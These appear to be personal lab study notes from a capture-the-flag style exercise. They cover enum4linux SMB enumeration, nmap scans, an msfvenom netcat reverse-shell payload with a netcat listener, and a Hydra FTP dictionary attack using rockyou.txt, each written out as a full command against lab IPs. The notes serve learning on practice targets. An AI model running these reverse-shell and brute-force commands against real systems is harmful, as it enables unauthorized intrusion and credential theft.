
### Enum4Linux Summary

- **Purpose**: Enumerates SMB shares on Windows/Linux systems.
- **Function**: Wrapper for Samba tools to extract SMB information easily.
- **Availability**: Pre-installed on AttackBox; installable from GitHub.

###### Syntax:

```bash
enum4linux [options] ip
```

###### Common Tags and Functions:

- **-U**: Get user list
- **-M**: Get machine list
- **-N**: Get namelist dump (different from -U and -M)
- **-S**: Get share list
- **-P**: Get password policy info
- **-G**: Get group and member list
- **-a**: Full enumeration (all options above)


here i used 
enum4linux 10.10.212.180 -a


![[Pasted image 20250107192757.png]]


## Nmap

to look for **scripts**
- grep "ftp-anon" /usr/share/nmap/scripts/script.db  


good tcp aggressive scan and saving the file on current dir named : nmapthm
 
- └─$ sudo nmap -p- -A -T5 -sT 10.10.212.180  -oN nmapthm

also this works fine and simple using syn scan

- nmap -vv  -T5 -oN NmapScan -p- 10.10.147.81

after getting open ports you need to scan specific port like this in order to foxus on it

	sudo nmap -A -T4 -vv -p 8012 -oN NmapPortScan 10.10.147.81

Explanation of Changes:

- Removed `-sT`: It's unnecessary unless a full TCP connect scan is specifically needed.
- Removed `-sC`: It's included in `-A`.
- Adjusted `-T5` to `-T4`: `-T4` is fast but more reliable and less likely to cause issues with firewalls.


did an nmap scan 

found one open port now focus on it

**import**
	PORT     STATE SERVICE REASON  VERSION
	8012/tcp open  unknown syn-ack
	| fingerprint-strings: 
	|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
	|_    SKIDY'S BACKDOOR. Type .HELP to view commands


that scan says that this can be used ass a backdoor .   SKIDY'S BACKDOO.



## using msfvenom

We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:  

**"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"**

-p = payload

lhost = our local host IP address (this is **your** machine's IP address)

lport = the port to listen on (this is the port on **your** machine)

R = export the payload in raw format


this did not work , how i fixed it :

ip a 

gets the ip the put it directly in lhost

└─$ msfvenom -p cmd/unix/reverse_netcat LHOST=10.21.117.138 lport=4444 R

Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:

**"nc -lvnp [listening port]"**


Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!

![[Pasted image 20250107223617.png]]


![[Pasted image 20250107223636.png]]


## Hydra


**Hydra** is a powerful password-cracking tool that supports **over 50 protocols**, including FTP. It can perform rapid **dictionary attacks** on various services.

**Command Syntax for Hydra:**

```bash
hydra -t 4 -l [username] -P [path to wordlist] -vV [target IP] ftp
```

###### **Breaking Down the Command**:

| **Section**             | **Function**                                                                      |
| ----------------------- | --------------------------------------------------------------------------------- |
| `hydra`                 | Executes the Hydra tool                                                           |
| `-t 4`                  | Specifies **4 parallel connections** for faster cracking                          |
| `-l [user]`             | Specifies the **username** for the account being targeted (e.g., "dale")          |
| `-P [path to wordlist]` | Specifies the path to a **wordlist** of potential passwords (e.g., "rockyou.txt") |
| `-vV`                   | Enables **verbose mode**, showing login attempts and results                      |
| `[target IP]`           | The **IP address** of the target machine                                          |
| `ftp`                   | Specifies the **FTP protocol** for Hydra to attack                                |

---

###### **Example Command**:

```bash
hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
```

This command will attempt to crack the FTP password for the user **dale** on the server at **10.10.10.6**, using the **rockyou.txt** wordlist.
